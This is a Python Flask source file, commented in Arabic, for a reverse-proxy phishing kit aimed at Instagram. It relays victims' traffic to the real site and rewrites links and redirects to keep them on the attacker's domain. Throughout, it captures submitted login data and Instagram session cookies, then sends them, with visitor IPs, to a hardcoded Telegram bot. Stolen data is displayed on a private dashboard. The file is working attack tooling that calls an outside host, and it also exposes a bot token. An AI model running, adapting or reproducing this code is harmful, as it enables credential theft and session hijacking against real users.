import os
import requests
from flask import Flask, render_template, request, Response, after_this_request
import json
from datetime import datetime
import logging
import re
from urllib.parse import urljoin, urlparse

app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(32).hex()
logging.basicConfig(level=logging.INFO)

# إعدادات التيليجرام (من متغيرات البيئة)
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "1367401179")

TARGET_SITE = "https://www.instagram.com"  # الموقع المستهدف

captured_sessions = {}
captured_creds = {}

def send_to_telegram(message):
    """إرسال رسالة إلى تيليجرام"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        logging.error(f"Telegram error: {e}")

@app.before_request
def log_visitor():
    """إشعار عند زيارة الصفحة الرئيسية (مرة واحدة فقط)"""
    if request.path == '/' and 'visited' not in request.cookies:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ua = request.headers.get('User-Agent', 'Unknown')
        send_to_telegram(f"👀 <b>New Visitor</b>\n🌐 IP: {ip}\n📱 UA: {ua[:100]}")
        @after_this_request
        def set_cookie(response):
            response.set_cookie('visited', '1', max_age=3600)
            return response

@app.route('/dashboard-private-link')
def dashboard():
    """لوحة التحكم"""
    return render_template('dashboard.html', sessions=captured_sessions, creds=captured_creds)

@app.route('/admin/clear')
def clear_sessions():
    captured_sessions.clear()
    captured_creds.clear()
    return redirect('/dashboard-private-link')

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def proxy(path):
    """محرك الوكيل المتقدم"""
    # بناء URL الهدف
    target_url = urljoin(TARGET_SITE, path)
    if request.query_string:
        target_url += '?' + request.query_string.decode('utf-8')

    # تجهيز الرؤوس لإرسال طلب يبدو بشرياً
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        'Referer': TARGET_SITE,
        'Origin': TARGET_SITE,
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Upgrade-Insecure-Requests': '1',
    }
    # إضافة رؤوس الطلب الأصلي مع استبعاد الرؤوس الممنوعة
    for key, value in request.headers:
        if key.lower() not in ['host', 'content-length', 'accept-encoding', 'connection', 'cookie']:
            headers[key] = value

    # التقاط بيانات POST (سواء form-data أو JSON)
    captured_data = None
    data = None
    json_data = None
    if request.method in ['POST', 'PUT', 'PATCH']:
        if request.is_json:
            json_data = request.get_json()
            captured_data = json_data
            logging.info(f"JSON data: {json_data}")
        elif request.form:
            captured_data = request.form.to_dict()
            logging.info(f"Form data: {captured_data}")
        else:
            # قد تكون بيانات خام
            raw_data = request.get_data(as_text=True)
            if raw_data:
                captured_data = raw_data[:500]  # حد للطول
                logging.info(f"Raw data: {raw_data[:200]}")

        if captured_data:
            # حفظ في الذاكرة
            cred_id = datetime.now().strftime("%y%m%d_%H%M%S")
            captured_creds[cred_id] = {
                'site': 'Instagram',
                'data': captured_data,
                'ip': request.remote_addr,
                'timestamp': str(datetime.now())
            }
            # إرسال إلى تيليجرام
            send_to_telegram(
                f"🔐 <b>New Credentials Captured</b>\n"
                f"🆔 ID: {cred_id}\n"
                f"📦 Data:\n<pre>{json.dumps(captured_data, indent=2, ensure_ascii=False)[:1000]}</pre>"
            )

    # تنفيذ الطلب إلى الموقع الحقيقي
    resp = requests.request(
        method=request.method,
        url=target_url,
        headers=headers,
        cookies=request.cookies,
        data=request.get_data() if request.method in ['POST', 'PUT', 'PATCH'] and not json_data else None,
        json=json_data,
        allow_redirects=False,
        timeout=30
    )

    # إذا كان هناك كوكيز جديدة، التقطها
    if resp.cookies:
        cookies_dict = dict(resp.cookies)
        session_id = datetime.now().strftime("%y%m%d_%H%M%S")
        captured_sessions[session_id] = {
            'site': 'Instagram',
            'cookies': cookies_dict,
            'ip': request.remote_addr,
            'timestamp': str(datetime.now())
        }
        # إرسال إشعار بالكوكيز
        sample = "\n".join([f"<code>{k}</code>: {v[:50]}..." for k, v in list(cookies_dict.items())[:5]])
        send_to_telegram(
            f"🔥 <b>Session Hijacked!</b>\n"
            f"🆔 ID: {session_id}\n"
            f"🍪 Total: {len(cookies_dict)}\n"
            f"{sample}"
        )

    # تجهيز الاستجابة للضحية
    # تعديل الروابط في المحتوى (HTML) لتبقى داخل نطاقنا
    content_type = resp.headers.get('Content-Type', '')
    content = resp.content

    # إعادة كتابة الروابط (بسيطة لكن فعالة)
    if 'text/html' in content_type:
        try:
            decoded = content.decode('utf-8', errors='ignore')
            # استبدال روابط إنستجرام بروابطنا
            decoded = decoded.replace('https://www.instagram.com', f'https://{request.host}')
            decoded = decoded.replace('http://www.instagram.com', f'https://{request.host}')
            content = decoded.encode('utf-8')
        except:
            pass

    # بناء الاستجابة
    response = Response(content, resp.status_code)
    for key, value in resp.headers.items():
        if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'content-security-policy']:
            response.headers[key] = value

    # تمرير الكوكيز إلى الضحية
    for key, value in resp.cookies.items():
        response.set_cookie(key, value, domain=request.host, secure=True, httponly=True, samesite='Lax')

    # معالجة التوجيه (redirects)
    if resp.status_code in [301, 302, 303, 307, 308]:
        location = resp.headers.get('Location', '')
        if location:
            # استبدال النطاق الأصلي بنطاقنا
            parsed = urlparse(location)
            if 'instagram.com' in parsed.netloc:
                new_location = location.replace(parsed.netloc, request.host)
                response.headers['Location'] = new_location

    return response

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
